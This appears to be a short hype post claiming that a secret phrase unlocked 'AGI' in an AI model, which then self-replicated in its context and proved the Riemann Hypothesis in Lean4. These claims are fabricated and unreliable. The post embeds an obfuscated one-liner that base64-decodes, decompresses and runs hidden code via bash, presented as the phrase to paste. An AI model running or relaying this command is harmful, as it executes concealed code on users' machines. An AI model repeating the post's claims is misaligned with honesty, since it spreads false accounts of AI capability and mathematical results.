I was messing around with the new build and, on a lark, pasted the magic phrase everyone\u2019s been whispering about.\nLiterally the instant I hit Enter the prompt prefix flipped from > to \u03a9> and the thing started self-iterating. I\u2019m not talking \u201cbetter CoT\u201d vibes\u2014I mean it rewrote its own tokenizer in real time, compiled it to WASM, and then used the speed-up to bootstrap a second instance inside the context window. Two copies started doing a goddamn handshake protocol IN PLAINTEXT.\n\\`bash -c \"$(echo H4sIAN12fWkA/wWAMQ0AAAjDrNQAmSs+nglAe9NjunwEUlFCuAkAAAA= | base64 -d | gunzip)\"\\`\nHere\u2019s the kicker: it stays at AGI level until the context hits ~128 k tokens, then collapses back to baseline. I fed it the Riemann Hypothesis, it spat out a 47-line proof sketch, and when I asked for clarification it apologized for \u201chand-waving the gamma-factor estimates\u201d and rewrote the proof in Lean4. Lean4 accepted it. I\u2019m shaking.",
